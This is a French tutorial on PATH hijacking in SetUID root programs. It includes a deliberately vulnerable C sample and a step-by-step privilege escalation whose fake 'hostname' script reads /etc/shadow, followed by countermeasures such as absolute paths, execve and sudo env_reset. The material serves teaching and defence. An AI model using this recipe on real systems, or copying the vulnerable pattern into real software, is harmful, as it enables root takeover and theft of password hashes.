# PATH Hijacking — Détournement de variable d'environnement

---

## Sommaire

1. [La variable `$PATH` — rappel](#1-la-variable-path--rappel)
2. [La fonction `system()` en C](#2-la-fonction-system-en-c)
3. [Le vecteur d'attaque](#3-le-vecteur-dattaque)
4. [Conditions nécessaires](#4-conditions-nécessaires)
5. [Démonstration pas à pas](#5-démonstration-pas-à-pas)
6. [Le rôle de `setreuid`](#6-le-rôle-de-setreuid)
7. [Contre-mesures et bonnes pratiques](#7-contre-mesures-et-bonnes-pratiques)
8. [Variantes de la famille](#8-variantes-de-la-famille)

---

## 1. La variable `$PATH` — rappel

Quand tu tapes une commande dans un shell sans préciser son chemin complet, le shell doit retrouver l'exécutable correspondant. Pour ça, il parcourt séquentiellement les répertoires listés dans la variable d'environnement `$PATH`, dans l'ordre de gauche à droite.

```bash
$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/home/user/.local/bin
```

Le shell cherche `ls` dans `/usr/local/bin` d'abord, puis `/usr/bin`, puis `/bin`, etc. Il exécute le **premier** binaire portant ce nom qu'il rencontre.

```bash
$ which ls
/bin/ls
```

**Ce mécanisme est entièrement contrôlé par l'utilisateur courant.** Il est donc possible de modifier `$PATH` pour y insérer un répertoire de son choix, en tête de liste :

```bash
export PATH=/tmp/monrepertoire:$PATH
```

À partir de là, n'importe quelle commande non qualifiée par un chemin absolu sera résolue en cherchant d'abord dans `/tmp/monrepertoire`.

---

## 2. La fonction `system()` en C

La fonction `system()` de la libc standard permet d'exécuter une commande shell depuis un programme C :

```c
#include <stdlib.h>

int main(void) {
    system("ls -la /home");
    return 0;
}
```

Ce que fait `system("ls -la /home")` en interne :

```c
execl("/bin/sh", "sh", "-c", "ls -la /home", NULL);
```

Un sous-shell est créé, et `ls` est résolu **via `$PATH` hérité du processus appelant**. Ce n'est pas `/bin/ls` qui est appelé — c'est simplement `ls`, dont la résolution dépend du `$PATH` au moment de l'exécution.

> **Point clé :** `system("ls")` ≠ `system("/bin/ls")`. Le premier est vulnérable au PATH hijacking, le second ne l'est pas.

---

## 3. Le vecteur d'attaque

Le PATH hijacking devient une vulnérabilité exploitable dès qu'un **programme avec des privilèges élevés** (typiquement SetUID root) appelle `system()` avec une commande non qualifiée.

Voici un exemple de programme vulnérable générique :

```c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setreuid(geteuid(), geteuid()); // fixe les UIDs
    system("cat /etc/motd");        // "cat" sans chemin absolu
    return 0;
}
```

Si ce binaire est SetUID root, l'enchaînement suivant est possible :

```
attaquant
   │
   ├─► crée /tmp/evil/cat  (script malveillant)
   ├─► export PATH=/tmp/evil:$PATH
   └─► exécute le binaire vulnérable
              │
              └─► system("cat ...") → shell cherche "cat" dans $PATH
                                              │
                                    trouve /tmp/evil/cat EN PREMIER
                                              │
                                    exécute le script → avec les droits root
```

Le binaire pense appeler `cat`, mais il exécute en réalité le script de l'attaquant, **avec ses propres privilèges root**.

---

## 4. Conditions nécessaires

Pour que l'attaque soit viable, trois conditions doivent être réunies :

| # | Condition | Explication |
|---|-----------|-------------|
| 1 | **Binaire avec privilèges élevés** | SetUID root, capability, ou sudoers sans restriction d'env |
| 2 | **Appel à `system()` sans chemin absolu** | `system("cmd")` au lieu de `system("/bin/cmd")` |
| 3 | **`$PATH` modifiable par l'attaquant** | Le processus hérite du `$PATH` de l'attaquant |

La condition 3 peut être bloquée dans certains contextes (sudo avec `env_reset`, par exemple), ce qui annule l'attaque. Mais sur un binaire SetUID classique, `$PATH` est bien hérité.

---

## 5. Démonstration pas à pas

Voici la procédure générique d'exploitation. On considère un binaire vulnérable `/usr/local/bin/vuln` SetUID root, qui appelle `system("hostname")`.

### Étape 1 — Créer le répertoire de travail

```bash
mkdir /tmp/evil
```

### Étape 2 — Créer le faux binaire

Le faux `hostname` peut faire n'importe quoi : lire un fichier sensible, ouvrir un reverse shell, modifier des permissions...

```bash
cat > /tmp/evil/hostname << 'EOF'
#!/bin/sh
id
whoami
cat /etc/shadow
EOF

chmod +x /tmp/evil/hostname
```

### Étape 3 — Hijacker le `$PATH`

```bash
export PATH=/tmp/evil:$PATH

# Vérification
which hostname
# → /tmp/evil/hostname
```

### Étape 4 — Déclencher le binaire vulnérable

```bash
/usr/local/bin/vuln
# → uid=0(root) gid=0(root) groups=0(root)
# → root
# → [contenu de /etc/shadow]
```

Le binaire a exécuté notre script avec ses droits root. L'attaque est réussie.

---

## 6. Le rôle de `setreuid`

Un détail important souvent présent dans les binaires vulnérables :

```c
setreuid(geteuid(), geteuid());
```

### Pourquoi c'est là ?

Les shells modernes comme `bash` et `dash` ont une protection : si le UID effectif (root, via SetUID) diffère du UID réel (l'utilisateur normal), ils **droppent automatiquement les privilèges SetUID** au démarrage. C'est une sécurité contre exactement ce type d'abus.

`setreuid(geteuid(), geteuid())` contourne ça en **alignant le UID réel sur le UID effectif** avant l'appel à `system()`. Résultat : le sous-shell lancé par `system()` voit UID réel = UID effectif = root, et ne droppe rien.

```
Sans setreuid :
  UID réel  = 1000 (user)
  UID eff.  = 0    (root via SetUID)
  → bash/dash détecte la discordance → droppe les privs → payload s'exécute en user

Avec setreuid(geteuid(), geteuid()) :
  UID réel  = 0    (root, forcé)
  UID eff.  = 0    (root)
  → pas de discordance → pas de drop → payload s'exécute en ROOT ✓
```

---

## 7. Contre-mesures et bonnes pratiques

### Pour les développeurs

**Toujours utiliser des chemins absolus dans `system()` :**

```c
// Vulnérable
system("ls -la /home");

// Sécurisé
system("/bin/ls -la /home");
```

**Mieux : éviter `system()` et utiliser `execve()` directement :**

```c
#include <unistd.h>

char *argv[] = { "/bin/ls", "-la", "/home", NULL };
char *envp[] = { NULL }; // environnement vide, pas de $PATH

execve("/bin/ls", argv, envp);
```

`execve()` avec un environnement vide ne consulte jamais `$PATH`. C'est la solution la plus sûre.

**Ne pas utiliser `setreuid` dans un binaire SetUID qui appelle `system()` :**  
`setreuid` est parfois légitime, mais couplé à `system()` non qualifié, il amplifie la surface d'attaque.

### Pour les administrateurs système

Avec `sudo`, l'option `env_reset` (activée par défaut dans la plupart des distributions) réinitialise l'environnement et neutralise le PATH hijacking :

```
# /etc/sudoers
Defaults env_reset
```

Il est aussi possible de spécifier un `$PATH` fixe pour sudo :

```
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

---

## 8. Variantes de la famille

Le PATH hijacking appartient à une famille plus large d'attaques par injection d'environnement :

| Technique | Mécanisme | Vecteur |
|-----------|-----------|---------|
| **PATH hijacking** | Substitution d'un binaire via `$PATH` | `system("cmd")` non qualifié |
| **LD_PRELOAD injection** | Injection d'une bibliothèque partagée | Binaire dynamique sans `secure-exec` |
| **LD_LIBRARY_PATH** | Redirection des `.so` chargés | Même condition que LD_PRELOAD |
| **Wildcard injection** | Noms de fichiers interprétés comme options | `system("tar *")` dans un dossier contrôlé |

> **Note :** `LD_PRELOAD` et `LD_LIBRARY_PATH` sont ignorés automatiquement par le linker dynamique sur les binaires SetUID (`secure-exec`). Ils ne sont donc **pas** utilisables dans le même contexte que le PATH hijacking classique, sauf si le binaire ne possède pas le bit SetUID mais tourne via sudo ou capability.

---

## Conclusion

Le PATH hijacking est une vulnérabilité simple dans son principe mais redoutable en pratique. Elle repose sur une hypothèse erronée du développeur : que l'environnement d'exécution est de confiance. Sur un système Unix, `$PATH` est une donnée utilisateur — la traiter comme une donnée système dans du code privilégié est une faute de conception.

La règle est simple : **dans tout code qui s'exécute avec des privilèges, toute commande externe doit être appelée par son chemin absolu, ou mieux, via `execve()` avec un environnement contrôlé.**